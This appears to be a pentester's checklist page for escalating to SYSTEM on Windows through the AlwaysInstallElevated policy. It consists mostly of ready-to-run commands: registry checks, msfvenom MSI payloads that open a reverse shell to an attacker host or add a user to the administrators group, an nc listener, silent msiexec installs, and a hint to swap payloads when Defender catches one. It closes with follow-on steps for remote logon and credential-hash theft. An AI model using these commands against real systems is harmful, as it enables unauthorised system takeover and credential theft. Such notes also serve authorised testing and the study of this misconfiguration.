# Windows privesc: AlwaysInstallElevated

## Check both keys
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
The same from PowerShell:
Get-ItemProperty HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer, HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer
- [ ] Both exist and are 0x1: one alone does nothing
- [ ] winPEAS reports it too, under AlwaysInstallElevated
- [ ] Every Windows Installer package now runs as SYSTEM

## An MSI that calls back
On Kali, then into the target's upload/ folder for serve:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi -o setup.msi
rlwrap nc -lvnp <LPORT>
- [ ] 32-bit Windows: windows/shell_reverse_tcp instead
- [ ] Fetched to C:\Users\Public\setup.msi on the target, with the line serve files gives

## Or one that makes me an administrator
When I know <Username>'s password, and a shell is not worth the noise:
msfvenom -p windows/x64/exec CMD='net localgroup administrators <Username> /add' -f msi -o admin.msi
- [ ] Fetched to C:\Users\Public\admin.msi

## Install it
msiexec /quiet /qn /i C:\Users\Public\setup.msi
Or the administrator one:
msiexec /quiet /qn /i C:\Users\Public\admin.msi
- [ ] An install error is expected: msfvenom's package fails on purpose once the payload has run, so nothing stays installed
- [ ] Nothing at all: Defender ate it, so the exec one, or a payload of my own

## Afterwards
whoami
net localgroup administrators
- [ ] nt authority\system in the shell, or <Username> in the group
- [ ] For the new group, a fresh logon: evil-winrm, or RunasCs as in :Pb runas
- [ ] Hashes next: :Pb windows-creds
